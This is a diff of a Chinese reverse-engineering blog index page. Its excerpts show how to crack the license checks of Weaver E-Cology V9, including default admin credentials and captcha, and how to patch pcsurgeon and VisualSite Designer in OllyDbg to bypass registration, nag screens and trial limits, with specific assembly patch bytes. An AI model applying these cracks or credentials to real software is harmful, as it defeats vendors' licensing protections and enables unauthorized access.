@@ -203,6 +203,18 @@
 <h2 id="寻找入口点"><a href="#寻找入口点" class="headerlink" title="寻找入口点"></a>寻找入口点</h2><h3 id="找到license校验入口"><a href="#找到license校验入口" class="headerlink" title="找到license校验入口"></a>找到license校验入口</h3><p>进入管理员页面，输入账密进行登录：<code>sysadmin/Weaver@2001</code></p>
 <p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692521595225.png" alt="1692521595225"></p>
 <p>此处提示没有授权，我们可以自行构造一个<code>1.license</code>文件进行测试并抓包，输入默认验证码：<code>wEAver2018</code></p>
+<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1693211838563.png" alt="1693211838563"></p>
+<p>可以得到如下URL：<code>http://xxx:8888/api/system/license/LicenseOperation</code></p>
+<p>需要关注的字符串为<code>LicenseOperation</code>，字面意思就是对处理License信息</p>
+<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1693212121940.png" alt="1693212121940"></p>
+<p>进入安装根目录，使用如下命令搜索字符串<code>LicenseOperation</code>，拿到一个类文件<code>./classbean/com/engine/license/web/LicenseAction.class</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/weaver/ecology</span><br><span class="line">grep -rl LicenseOperation ./</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692522562629.png" alt="1692522562629"></p>
+<p>将拿到的<code>LicenseAction.class</code>文件使用<code>fernflower</code>工具进行反编译，得到java源码</p>
+<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692525093673.png" alt="1692525093673"></p>
+<p><code>LicenseAction.java</code>重点关注<code>LicenseOperation</code>访问路径的相关代码，然后关注引入的<code>ln.LN</code>类，其中第18行代码处的</p>
+<p><code>var8 = var10.CkLicense(TimeUtil.getCurrentTimeString());</code>这里就调用了<code>ln.LN</code>类的<code>CkLicense</code>方法，后续代码则是对其返回值进行判断，显然这里是处理<code>license</code>的地方，需要在Ecology安装目录下找到这个class文件或者jar包</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/#more" rel="contents">
@@ -472,86 +484,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/11/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yuband">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yuband's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/11/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">理解Java反序列化漏洞原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-11 17:29:18" itemprop="dateCreated datePublished" datetime="2023-02-11T17:29:18+08:00">2023-02-11</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java-web/" itemprop="url" rel="index"><span itemprop="name">Java web</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java-web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​		在众多的开发语言中，Java因其跨平台性和强大的功能库被广泛应用。然而，随着其在业界的广泛使用，Java的安全问题也随之凸显，其中Java反序列化漏洞是近年来引起广泛关注的安全问题。本文旨在深入介绍Java反序列化漏洞，包括其原理，产生的原因，以及通过编写和测试代码来进行分析学习。</p>
-<h2 id="了解Java反序列化漏洞"><a href="#了解Java反序列化漏洞" class="headerlink" title="了解Java反序列化漏洞"></a>了解Java反序列化漏洞</h2><p>​		Java反序列化漏洞是一种严重的安全漏洞，允许攻击者通过构造恶意的序列化对象，执行任意代码。这类漏洞的严重性在于，反序列化操作在设计上就允许执行序列化对象中定义的任何代码。这就使得攻击者可以利用这一特性，构造恶意的序列化对象，从而在反序列化过程中执行恶意代码。</p>
-<p>​		一个著名的例子是<code>Apache Commons Collections</code>库中的反序列化漏洞，也被称为<code>Mad Gadget</code>。这个漏洞允许攻击者构造一个恶意的序列化对象，该对象包含一个<code>InvokerTransformer</code>对象，这个对象可以在反序列化过程中执行任意代码。这个漏洞影响了许多使用了这个库的Java应用，包括一些流行的开源项目和商业产品。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/11/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/12/Spring-Beans-RCE%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -633,8 +565,577 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuband">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuband's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">pcsurgeon程序破解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-10-15 10:35:14" itemprop="dateCreated datePublished" datetime="2022-10-15T10:35:14+08:00">2022-10-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="破解重点"><a href="#破解重点" class="headerlink" title="破解重点"></a>破解重点</h3><p>找到处理注册函数的位置，打上patch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据程序显示的&quot;&lt;unregistered &quot;字符串，找到引用该地址的汇编代码</span><br></pre></td></tr></table></figure>
+
+<p>破解问题</p>
+<p>无法在win7运行，可能需要在XP上面跑，</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1687782371391.png" alt="1687782371391"></p>
+<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><h4 id="破解一（修改判断逻辑）"><a href="#破解一（修改判断逻辑）" class="headerlink" title="破解一（修改判断逻辑）"></a>破解一（修改判断逻辑）</h4><h5 id="分析与破解过程"><a href="#分析与破解过程" class="headerlink" title="分析与破解过程"></a>分析与破解过程</h5><p>首先打开程序，看到上面显示的未注册，我们可以定位到字符串位置：<code>&lt;unregistered</code></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260038823.png" alt="1689260038823"></p>
+<p>选择<code>查找</code>—&gt;<code>所有参考文本字串</code>，然后拖到最上面，右键选择<code>查找文本</code></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260124988.png" alt="1689260124988"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260227282.png" alt="1689260227282"></p>
+<p>找到了符合的字符串，然后双击找到引用该字符串的位置，我们可以发现，在该处汇编的上一行明显有一个跳转判断，可以猜测若跳过下面的执行，则越过了输出未注册字样，因此在此处jnz处打上断点</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260312915.png" alt="1689260312915"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260398316.png" alt="1689260398316"></p>
+<p>重新运行，显然此处并没有跳转，而是下面获取了未注册字样，我们先尝试将标志位<code>z</code>置为0</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263390397.png" alt="1689263390397"></p>
+<p>越过后，顶部的显示消失了，然后点击<code>help</code>，查看未注册是否还在显示</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263490977.png" alt="1689263490977"></p>
+<p>显然还是属于未注册</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263545144.png" alt="1689263545144"></p>
+<p>继续查找字符串<code>&lt;Unregistered Version&gt;</code>，同样的，也是在获取字符串的上面有一个跳转，打上断点，然后修改标注位，成功破解</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263662688.png" alt="1689263662688"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263765717.png" alt="1689263765717"></p>
+<h5 id="打Patch"><a href="#打Patch" class="headerlink" title="打Patch"></a>打Patch</h5><p>一共两处需要跳转，都修改为<code>jmp</code>即可，保存为新文件<code>pcsurgeon1.exe</code>，运行后显示注册成功</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263984191.png" alt="1689263984191"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689264016694.png" alt="1689264016694"></p>
+<h4 id="破解二（修改认证文件OR数据？）"><a href="#破解二（修改认证文件OR数据？）" class="headerlink" title="破解二（修改认证文件OR数据？）"></a>破解二（修改认证文件OR数据？）</h4><h5 id="破解分析"><a href="#破解分析" class="headerlink" title="破解分析"></a>破解分析</h5><p>同样根据特殊字符串<code>&lt;unregistered</code>进行定位，并在上面打一个断点，汇编代码如下，这里有两处比较，且都是<code>jnz pcsurgeo.005CC935</code>，这里可以猜测若第一个直接跳转，则不需要走第二个点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">005CC820   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005CC825   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005CC828   .  0F85 07010000 jnz pcsurgeo.005CC935</span><br><span class="line">005CC82E   .  A1 DCF16000   mov eax,dword ptr ds:[0x60F1DC]</span><br><span class="line">005CC833   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005CC836   .  0F85 F9000000 jnz pcsurgeo.005CC935</span><br></pre></td></tr></table></figure>
+
+<p>首先EAX的值为<code>4A 0C 61 00</code>，转换为内存地址为<code>0X00610C4A</code></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691137964.png" alt="1689691137964"></p>
+<p>然后<code>ds:[eax]</code>的值为<code>00 00 00 00</code>，这也导致了后面的CMP比较相等，ZF置为1，无法跳转，弹出了未注册标识，此处的想法是更改掉<code>ds:[eax]</code>的值进行绕过，可以先改为1然后试试</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691194958.png" alt="1689691194958"></p>
+<p>这里我们需要找到程序是在哪里给<code>ds:[eax]</code>赋值的，所以需要<code>右键</code>选择<code>参考</code>，然后选择<code>地址常量</code>，找到所有引用该地址的地方</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691480656.png" alt="1689691480656"></p>
+<p>然后给所有地址打上断点，重新运行程序</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691572488.png" alt="1689691572488"></p>
+<p>下面既是对关键字进行赋值，其中第二行赋值操作既是对上面的<code>ds:[eax]</code>进行赋值，这里可以直接将al替换成<code>0x01</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#将校验文件地址存储到EDX寄存器</span><br><span class="line">005C2BF6   .  8B15 8CEB6000 mov edx,dword ptr ds:[0x60EB8C]; pcsurgeo.00610C4A</span><br><span class="line">#将al赋值给校验地址</span><br><span class="line">005C2BFC   .  8802          mov byte ptr ds:[edx],al</span><br><span class="line">005C2BFE   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005C2C03   .  8038 00       cmp byte ptr ds:[eax],0x0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691614994.png" alt="1689691614994"></p>
+<p>修改如下，右键选择保存，但是报错了，提示修改了重定位信息，这是因为mov操作寄存器或者立即数时，对应的机器码不相等，原本操作寄存器时，机器码为：<code>88 02</code>，而立即数对应了<code>C6 02 01</code>，打乱了后面的汇编指令，造成了一堆NOP指令，这里报错可以先忽略，直接保存文件看看是否正常运行</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691916878.png" alt="1689691916878"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689691958162.png" alt="1689691958162"></p>
+<p>打开破解后的文件，已注册</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689692079948.png" alt="1689692079948"></p>
+<h5 id="解决重定位报错"><a href="#解决重定位报错" class="headerlink" title="解决重定位报错"></a>解决重定位报错</h5><h6 id="方法一（失败）"><a href="#方法一（失败）" class="headerlink" title="方法一（失败）"></a>方法一（失败）</h6><p>想办法填充NOP的位置，一共四个NOP指令，也就是4字节，可以使用<code> mov eax,eax</code>操作，不对正常业务造成影响，刚好占用两个字节，使用两次即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">89C0          mov eax,eax</span><br><span class="line">89C0          mov eax,eax</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693041865.png" alt="1689693041865"></p>
+<p>失败原因：后面CMP操作会比较EAX的值，这样会影响正常业务</p>
+<h6 id="方法二（成功）"><a href="#方法二（成功）" class="headerlink" title="方法二（成功）"></a>方法二（成功）</h6><p>重点放在下面几行汇编中，这是判断加跳转的语句，由于<code>ds:[eax]==0x01</code>，不等于<code>0x0</code>，那么下面的跳转一定会实现，所以我们可以直接更改代码逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">005C2BFE      A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]</span><br><span class="line">005C2C03      8038 00       cmp byte ptr ds:[eax],0x0</span><br><span class="line">005C2C06   .  75 0D         jnz short pcsurgeo.005C2C15</span><br></pre></td></tr></table></figure>
+
+<p>放弃CMP比较操作，直接改为赋值，解决了上面的NOP问题，然后直接使用<code>JMP</code>进行跳转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">005C2C03      C600 01       mov byte ptr ds:[eax],0x1</span><br><span class="line">005C2C06      EB 0D         jmp short pcsurgeo.005C2C15</span><br><span class="line">005C2C08   .  E8 6307EEFF   call pcsurgeo.004A3370</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693425366.png" alt="1689693425366"></p>
+<p>这次保存文件没有报错了，程序正常启动并且成功破解</p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693506484.png" alt="1689693506484"></p>
+<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689693535166.png" alt="1689693535166"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuband">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuband's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">VisualSite Designer逆向破解分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-17 21:16:34" itemprop="dateCreated datePublished" datetime="2022-09-17T21:16:34+08:00">2022-09-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="直接运行程序"><a href="#直接运行程序" class="headerlink" title="直接运行程序"></a>直接运行程序</h3><p>注意观察call指令的后几条指令，若为退出程序的指令，则说明该CALL为正常程序必须调用的，不可跳过</p>
+<p>首先会弹出一个NAG窗口，底下显示使用次数</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687078973564.png" alt="1687078973564"></p>
+<p>进入后界面如下</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687078995463.png" alt="1687078995463"></p>
+<p>关闭后又弹出NAG窗口</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079052395.png" alt="1687079052395"></p>
+<h3 id="Start-Cracking"><a href="#Start-Cracking" class="headerlink" title="Start Cracking"></a>Start Cracking</h3><p><strong>破解目的</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、去除程序刚启动弹出的NAG窗口</span><br><span class="line"><span class="number">2</span>、绕过<span class="number">10</span>次使用限制</span><br><span class="line"><span class="number">3</span>、去除程序退出时的NAG窗口</span><br></pre></td></tr></table></figure>
+
+<h4 id="破解场景一"><a href="#破解场景一" class="headerlink" title="破解场景一"></a>破解场景一</h4><p>首先要找到程序弹窗入口，使用<code>Ctrl+F8</code>自动化往下走</p>
+<p>发现在一个位置一直循环，可能是在校验程序信息</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079343943.png" alt="1687079343943"></p>
+<p>先断在<code>inc esi</code>处，发现为程序的绝对路径</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687079692679.png" alt="1687079692679"></p>
+<p>循环次数较多，可以先在循环外打个断点，然后重新运行程序，可以直接运行到断点处</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080040928.png" alt="1687080040928"></p>
+<p>之后一路<code>F8</code>，直到出现NAG窗口，在出现CALL的时候NAG弹出，此处不能跳过这个CALL，因为跳过之后，直接运行了程序退出函数，所有前面那个call是程序正常运行调用的，需要使用<code>F7</code>步入，在此处打上断点，重新运行程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004BD497  |.  E8 74000000   call VisualSi.004BD510</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080423077.png" alt="1687080423077"></p>
+<p>同样的，后面先一路F8，直到出现NAG窗口，再使用F7步入，一直循环往复，直到下面的这个CALL，使用F7进入后全是无条件跳转，后面就不需要继续跟进了</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080899178.png" alt="1687080899178"></p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687080919192.png" alt="1687080919192"></p>
+<p>我们选择启动程序，然后F8步过，发现返回的<code>EAX=0x00000001</code>，这里可能是校验使用</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687094137552.png" alt="1687094137552"></p>
+<p>现在尝试将这个函数调用NOP掉，或者直接给EAX赋值，移除次数验证</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687096313955.png" alt="1687096313955"></p>
+<p>然后保存文件，重新加载，第一个<code>NAG</code>已经去除了</p>
+<p>之后关闭程序前使用<code>alt+F9</code>，定位到关闭窗口的NAG，将那个CALL置为NOP即可</p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687098504565.png" alt="1687098504565"></p>
+<p>修改后为<code>NOP</code></p>
+<p><img src="/2022/09/17/VisualSite_Designer%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%88%86%E6%9E%90/1687098535297.png" alt="1687098535297"></p>
+<h4 id="破解场景二"><a href="#破解场景二" class="headerlink" title="破解场景二"></a>破解场景二</h4><p>前面是跳过了减数函数，所以可以无限使用，但如果次数用光了也无法使用，原因应该是写了注册表，但现在就不关注注册表的值了，还是以破解为主</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuband">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuband's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">ReverseMe逆向分析破解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-04 16:25:14" itemprop="dateCreated datePublished" datetime="2022-09-04T16:25:14+08:00">2022-09-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="GetModuleHandleA"><a href="#GetModuleHandleA" class="headerlink" title="GetModuleHandleA"></a>GetModuleHandleA</h3><p>获取模块句柄函数（返回的是私有句柄）</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935300048.png" alt="1668935300048"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935413298.png" alt="1668935413298"></p>
